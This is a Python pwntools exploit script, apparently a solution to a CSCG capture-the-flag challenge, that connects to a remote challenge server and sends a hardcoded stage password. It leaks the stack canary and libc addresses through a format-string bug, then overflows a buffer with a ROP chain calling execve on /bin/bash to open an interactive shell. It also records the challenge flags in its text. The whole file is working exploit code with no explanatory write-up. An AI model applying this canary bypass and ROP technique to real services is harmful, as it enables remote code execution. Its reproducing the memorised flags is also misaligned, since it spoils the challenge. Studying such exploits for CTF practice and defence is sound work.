#!/usr/bin/python
from pwn import *

STACK_CANARY_INDEX = 43
LIBC_RET_P_INDEX = 49
MAIN_RET_P_INDEX = 45
BASE_PTR_INDEX = 44


# first stage
p = remote("hax1.allesctf.net", 9102)
print("[info] attached to process ")

#prepare first payload (password)
PASSWORD = "CSCG{NOW_GET_VOLDEMORT}"

# info
print("[info] password is")
print("[info] " + PASSWORD)

# inject payload
p.recvuntil("Enter the password of stage 2:\n")
p.sendline(PASSWORD)

# info 
print("successfully passed pw check")

# format string exploitation
fstring = "%p " * 51
p.recvuntil("Enter your witch name:\n")
p.sendline(fstring)
leak = p.recvuntil(" enter your magic spell:\n")
addr_arr = leak.split(" ")

# stack protector
stack_canary = addr_arr[STACK_CANARY_INDEX]

# get some addresses
p_libc = addr_arr[LIBC_RET_P_INDEX]
base_ptr = addr_arr[BASE_PTR_INDEX]

# get offsets of .code sections (lets you then calculate every function and subroutine)
p_libc_code_off = int(p_libc,16) - 0x271e3
p_pwn3_code_off = int(addr_arr[MAIN_RET_P_INDEX],16) - 0xd7e


# lets get some address functions
p_execve = p_libc_code_off + 0xe6010
p_execvp = p_libc_code_off + 0xe6550 # 0xc1550
p_system =  p_libc_code_off + 0x554e0 # 0x304e0
p_exit = p_libc_code_off + 0x49d40 # 0xe5fb0

# info
print(" ###################### Stack Leaks ######################")
print("[info] libc .code offset@ " + hex(p_libc_code_off) )
print("[info]   --> execve@ " + hex(p_execve))
print("[info]   --> system@ " + hex(p_system))
print("[info]   --> exit@ " + hex(p_exit))
print("[info]   --> execvp@ " + hex(p_execvp))
print("[info] stack_canary@ " + stack_canary)
print("[info] stack base ptr@ " + base_ptr)
print("[info] pwn3 .code offset@ " + hex(p_pwn3_code_off))
print(" ##########################################################")


# flag CSCG{VOLDEMORT_DID_NOTHING_WRONG}
#preparing payload
payload = "Expelliarmus\x00" # that string
payload += "/bin/bash"
payload += (0xff - (len(payload)+1)) * '\x00' # fill to 255
payload += 10 * 'A' # alignment

# stack canary
payload += p64(int(stack_canary,16), endian='little') # place stack canary
# base pointer
payload += p64(int(base_ptr,16), endian='little')


# use rop gadgets // create args (works)
payload += p64((p_pwn3_code_off+0xdf3), endian='little') # rop gadget to pop rdi
payload += p64(int(base_ptr,16)-0x123, endian='little') # pointer to /bin/sh



payload += p64((p_libc_code_off+0x2709c), endian='little') # rsi (verified)
payload += p64(0x0, endian='little') # ---> null

payload += p64((p_libc_code_off+0x10582d), endian='little') # rdx (error)
payload += p64((0x0), endian='little') # --> null
payload += p64((0x0), endian='little') # --> null
payload += p64((0x0), endian='little') # --> null


payload += p64((p_pwn3_code_off+0x816), endian='little') # stack alignment

#payload += p64(p_system, endian='little') # system
payload += p64(p_execve, endian='little')

p.sendline(payload)
p.interactive()
